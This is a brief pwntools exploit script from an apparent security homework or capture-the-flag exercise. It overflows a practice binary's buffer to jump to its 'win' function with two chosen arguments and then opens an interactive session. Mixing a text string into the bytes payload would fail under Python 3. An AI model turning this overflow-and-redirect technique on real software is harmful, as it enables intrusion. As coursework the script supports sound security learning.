# First PWN Exploit HW 

from pwn import *

p = process('./bufover-2')
binary = ELF('./bufover-2')

win = binary.symbols['win']
# passing two arguments into function 

arg1 = 0x14B4DA55
arg2 = 0xF00dB4BE

payload = (0x1c)*b'A' + p32(binary.symbols["win"])
# add 4 bytes of junk
payload += 'gabe'
payload +=  p32(0x14B4DA55)
payload += p32(0) 
payload += p32(0xF00DB4BE)

p.sendline(payload)
p.interactive()
